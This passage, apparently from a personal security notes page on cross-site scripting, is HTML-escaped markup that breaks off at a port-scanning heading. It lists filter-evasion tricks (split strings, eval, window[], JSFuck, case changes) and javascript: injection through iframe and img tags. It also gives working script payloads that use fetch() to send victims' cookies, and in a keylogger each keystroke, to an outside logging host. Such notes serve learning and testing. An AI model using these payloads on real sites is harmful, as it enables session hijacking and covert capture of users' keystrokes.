style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;filter-evasion&quot;&gt;Filter evasion&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#filter-evasion&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;bypass-simple-word-filtering&quot;&gt;Bypass simple word filtering&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bypass-simple-word-filtering&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;In general, you can break up strings to get around this.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;javascript&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;javascript&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;alert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;H&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ello&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;eval()&lt;/code&gt; function can be used to turn strings into function names if a function is filtered.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;javascript&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;javascript&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;eval&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;lert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Hello&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;It’s also possible (and safer, though if we’re breaking into things we probably care a lot less about safety) to use &lt;code&gt;window[]&lt;/code&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;javascript&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;javascript&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;window&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;lert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;](&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Hello&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;For really heavy filtering, use something nutso like &lt;a href=&quot;http://www.jsfuck.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;JSFuck&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;(Note that things like the &lt;a href=&quot;https://obfuscator.io/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;JavaScript Obfuscator Tool&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; won’t always remove functions and strings, as they tend to be geared more towards thwarting script analysis than bypassing filters.)&lt;/p&gt;\n&lt;p&gt;Sometimes filters are applied in a case-sensitive fashion. While JavaScript &lt;em&gt;is&lt;/em&gt; case-sensitive, URL schemes, HTML tag names, and HTML tag attributes are case-&lt;em&gt;insensitive&lt;/em&gt; (so, &lt;code&gt;javascript:&lt;/code&gt; is treated the same as &lt;code&gt;javaSCRIPT:&lt;/code&gt;, &lt;code&gt;onclick&lt;/code&gt; is treated the same as &lt;code&gt;ONCLICK&lt;/code&gt;, etc.).&lt;/p&gt;\n&lt;h3 id=&quot;using-iframes-and-images&quot;&gt;Using iframes and images&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#using-iframes-and-images&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Typically XSS attacks work by injecting &lt;code&gt;&amp;#x3C;script/&gt;&lt;/code&gt; tags, but it’s also possible to inject JavaScript using the &lt;code&gt;&amp;#x3C;iframe/&gt;&lt;/code&gt; and &lt;code&gt;&amp;#x3C;img/&gt;&lt;/code&gt; tags by setting the &lt;code&gt;src&lt;/code&gt; attribute to the &lt;code&gt;javacript:&lt;/code&gt; pseudo-protocol. For example:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&amp;#x3C;!-- iframe injection --&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;iframe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; src&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;javascript:alert(&#039;XSS&#039;);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&amp;#x3C;!-- img injection --&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;img&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; src&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;javascript:alert(&#039;XSS&#039;);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note, however, that JavaScript loaded in an &lt;code&gt;&amp;#x3C;iframe/&gt;&lt;/code&gt; won’t have access to the parent page’s DOM.&lt;/p&gt;\n&lt;h3 id=&quot;fallbacks-requiring-user-interaction&quot;&gt;Fallbacks requiring user interaction&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#fallbacks-requiring-user-interaction&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;code&gt;javascript:&lt;/code&gt; &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URIs&lt;/a&gt; can also be included in anchor(&lt;code&gt;&amp;#x3C;a/&gt;&lt;/code&gt;) href attributes, as well as &lt;code&gt;onmouseover&lt;/code&gt; and &lt;code&gt;onclick&lt;/code&gt; attributes (which can be attached to almost any HTML tag). Getting these attacks to fire requires a user to interact with the modified tag, however.&lt;/p&gt;\n&lt;h2 id=&quot;common-objectives&quot;&gt;Common objectives&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#common-objectives&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;accessing-browser-cookies&quot;&gt;Accessing browser cookies&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#accessing-browser-cookies&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tfetch&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t\t&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://example.com/log&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\t\t+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;?cookie=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\t\t+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; btoa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;cookie&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h3 id=&quot;keylogging&quot;&gt;Keylogging&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#keylogging&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\tdocument&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;onkeypress&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tfetch&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t\t\t&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://example.com/log&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\t\t\t+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;?cookie=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\t\t\t+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; btoa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;cookie&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\t\t\t+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&amp;#x26;keypress=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\t\t\t+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; btoa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t\t);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Adding &lt;a href=&quot;https://developer.mozilla.org/docs/Web/API/Document/cookie&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the user’s cookies&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; here allows us to tell whose keystrokes are whose!&lt;/p&gt;\n&lt;h3 id=&quot;port-scanning&quot;&gt;Port scanning&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#port-scanning&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 